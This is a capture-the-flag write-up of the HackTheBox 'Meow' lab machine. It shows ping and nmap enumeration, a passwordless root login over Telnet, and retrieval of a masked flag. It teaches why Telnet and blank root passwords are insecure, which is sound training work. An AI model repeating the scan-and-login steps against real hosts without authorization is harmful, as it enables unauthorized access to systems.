# HackTheBox: Meow

* **Machine:** Meow
* **Platform:** HackTheBox
* **Category:** Starting Point
* **Tier:** 0
* **Difficulty:** Very Easy
* **OS:** Linux

## Enumeration

First, I checked whether the target was reachable:

```bash
└─$ ping -c 5 10.129.200.194
PING 10.129.200.194 (10.129.200.194) 56(84) 

--- 10.129.200.194 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4005ms
```

The host was reachable with **0% packet loss**.

Next, I scanned the target for open services:

```bash
└─$ nmap -sV 10.129.200.194     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-04 02:09 +0530
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port **23** was open and running **Telnet**.

## Initial Access

I connected to the Telnet service:

```bash
└─$ telnet 10.129.200.194
Connected to 10.129.200.194.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█

Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~#
```

The service prompted for a username, I attempted to login as `root`.  
The login was successful, giving me a root shell.

## Flag

I listed the current directory:

```bash
root@Meow:~# ls 
flag.txt  snap
root@Meow:~# cat flag.txt
********************************
root@Meow:~# 
```

Then read the flag.

## Summary

Meow demonstrates the security risks of using **Telnet**, an old remote-access protocol that sends communication without encryption. The machine exposes Telnet on port 23 and allows direct login as `root` without a password, resulting in immediate root access.

